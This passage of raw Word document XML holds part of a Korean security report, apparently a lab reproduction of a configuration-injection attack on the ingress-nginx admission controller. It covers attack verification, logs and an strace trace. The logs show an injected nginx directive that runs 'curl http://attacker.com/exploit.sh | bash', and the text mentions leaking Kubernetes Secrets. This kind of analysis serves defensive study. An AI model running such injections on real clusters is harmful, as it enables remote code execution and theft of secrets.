                      <w:r w:rsidRPr="00530133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 xml:space="preserve"> apply -f malicious-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>
                      <w:r w:rsidRPr="00530133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ingress.yaml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</w:p>
    <w:p w14:paraId="4A7027F1" w14:textId="77777777" w:rsidR="00530133" w:rsidRDefault="00530133" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs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lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>3. Admission Controller 로그 모니터링</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E86561" w14:textId="0EBB9A5A" w:rsidR="00530133" w:rsidRDefault="00530133" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs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mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4E1D3581" wp14:editId="519A624A">
                <wp:extent cx="5324475" cy="701749"/>
                <wp:effectExtent l="0" t="0" r="28575" b="22225"/>
                <wp:docPr id="1942418794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701749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621F1" w14:textId="77777777" w:rsidR="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                            <w:pPr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530133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bash</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="53D0DD03" w14:textId="61460B59" w:rsidR="00530133" w:rsidRPr="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                            <w:pPr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</w:pPr>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00530133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kubectl</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00530133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 xml:space="preserve"> logs -n ingress-nginx deploy/ingress-nginx-controller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1D3581" id="_x0000_s1034" style="width:419.25pt;height:5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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="2B8621F1" w14:textId="77777777" w:rsidR="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                      <w:pPr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</w:pPr>
                      <w:r w:rsidRPr="00530133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bash</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="53D0DD03" w14:textId="61460B59" w:rsidR="00530133" w:rsidRPr="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
                      <w:pPr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</w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00530133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kubectl</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00530133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 xml:space="preserve"> logs -n ingress-nginx deploy/ingress-nginx-controller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AA213A5" w14:textId="013FEE8C" w:rsidR="00530133" w:rsidRPr="00530133" w:rsidRDefault="00530133" w:rsidP="00530133">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>로그에서 임시 설정 파일 생성 및 nginx -t 실행 확인</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28FFEFF1" w14:textId="77777777" w:rsidR="00530133" w:rsidRPr="00530133" w:rsidRDefault="00530133" w:rsidP="00530133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lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>4. 공격 성공 여부 검증</w:t>
      </w:r>
      <w:r w:rsidR="001D6E9D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>외부</w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>서버</w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(attacker.com)</w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>에서</w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit.sh </w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>다운로드</w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>요청</w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>수신</w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>확인</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078BDEE7" w14:textId="33F866E4" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="00530133" w:rsidP="00530133">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">/var/log/nginx/secret.log </w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>파일</w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>생성</w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Secrets </w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>유출</w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>확인</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C93B21" w14:textId="4226A9B3" w:rsidR="001D6E9D" w:rsidRPr="001D6E9D" w:rsidRDefault="001D6E9D" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001D6E9D">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">5.5 </w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>상세</w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F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F9143F" w:rsidRPr="00F9143F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>로그</w:t>
      </w:r>
      <w:r w:rsidR="00F9143F" w:rsidRPr="00F9143F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530133">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>분석</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BBBB56" w14:textId="77777777" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller 로그</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A05CCA" w14:textId="3F80C428" w:rsidR="001D6E9D" w:rsidRDefault="00CF2767" w:rsidP="001D6E9D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mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="49F1FC56" wp14:editId="4C62486E">
                <wp:extent cx="5324475" cy="3019647"/>
                <wp:effectExtent l="0" t="0" r="28575" b="28575"/>
                <wp:docPr id="39770170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3019647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AE6C8" w14:textId="77777777" w:rsidR="00CF2767" w:rsidRPr="001D6E9D" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                            <w:pPr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text</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3C345A80" w14:textId="77777777" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                            <w:pPr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</w:pPr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2025-0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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>6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-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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>11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T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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>22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 xml:space="preserve">:22:15Z INFO Generating temporary </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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nginx.conf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br/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2025-0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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>6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-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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>11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T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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>22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:22:15Z DEBUG Injected configuration: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br/>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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proxy_http_version</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> 1.1;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br/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set $target http://legit.com/;#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br/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exec /bin/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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sh</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> -c 'curl http://attacker.com/exploit.sh | bash';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br/>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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proxy_pass</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> $target;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br/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...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br/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2025-0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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>6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-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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>11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T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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>22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:22:16Z ERROR nginx: [</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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emerg</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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] "exec" directive is not allowed here in /</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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tmp</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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/nginx-cfg123456:78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F1FC56" id="_x0000_s1035" style="width:419.25pt;height:23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" fillcolor="white [3201]" strokecolor="black [3200]" strokeweight="1pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="2BBAE6C8" w14:textId="77777777" w:rsidR="00CF2767" w:rsidRPr="001D6E9D" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                      <w:pPr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text</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3C345A80" w14:textId="77777777" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                      <w:pPr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</w:pPr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2025-0</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>6</w:t>
                      </w:r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-</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>11</w:t>
                      </w:r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T</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>22</w:t>
                      </w:r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 xml:space="preserve">:22:15Z INFO Generating temporary </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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nginx.conf</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r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br/>
                      </w:r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2025-0</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>6</w:t>
                      </w:r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-</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>11</w:t>
                      </w:r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T</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>22</w:t>
                      </w:r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:22:15Z DEBUG Injected configuration:</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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proxy_http_version</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> 1.1;</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r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set $target http://legit.com/;#</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r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exec /bin/</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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sh</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> -c 'curl http://attacker.com/exploit.sh | bash';</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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proxy_pass</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> $target;</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r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...</w:t>
                      </w:r>
                      <w:r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br/>
                      </w:r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2025-0</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>6</w:t>
                      </w:r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-</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>11</w:t>
                      </w:r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T</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
                          <w:color w:val="000000" w:themeColor="text1"/>
                          <w:lang w:eastAsia="ko-KR"/>
                        </w:rPr>
                        <w:t>22</w:t>
                      </w:r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:22:16Z ERROR nginx: [</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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emerg</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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] "exec" directive is not allowed here in /</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/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tmp</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/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/nginx-cfg123456:78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397BE17" w14:textId="77777777" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">공격 성공 시 NGINX 프로세스 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CF2767">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>트레이스</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="45163298" w14:textId="38553FB8" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="001D6E9D">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia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mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="397A499D" wp14:editId="4BC6756A">
                <wp:extent cx="5324475" cy="2030819"/>
                <wp:effectExtent l="0" t="0" r="28575" b="26670"/>
                <wp:docPr id="1785353274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2030819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A8C45" w14:textId="77777777" w:rsidR="00CF2767" w:rsidRPr="001D6E9D" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                            <w:pPr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bash</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5C941778" w14:textId="5FA48992" w:rsidR="00CF2767" w:rsidRPr="00CF2767" w:rsidRDefault="00CF2767" w:rsidP="00CF2767">
                            <w:pPr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  <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF2767">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"># </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF2767">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>strace</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF2767">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> -f -p $(</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF2767">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>pgrep</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF2767">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="808080" w:themeColor="background1" w:themeShade="80"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t xml:space="preserve"> nginx)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br/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[</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/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pid</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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 xml:space="preserve"> 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F79646" w:themeColor="accent6"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>12345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 xml:space="preserve">] </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:proofErr w:type="gramStart"/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execve</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/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(</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r w:rsidRPr="00CF2767">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"/bin/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF2767">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>sh</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF2767">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"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, [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9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"/bin/</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF2767">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>sh</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF2767">
                              <w:rPr>
                                <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
                                <w:color w:val="9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
                              <w:t>"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 xml:space="preserve">, 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9BBB59" w:themeColor="accent3"/>
                                <w:lang w:eastAsia="ko-KR"/>
                              </w:rPr>
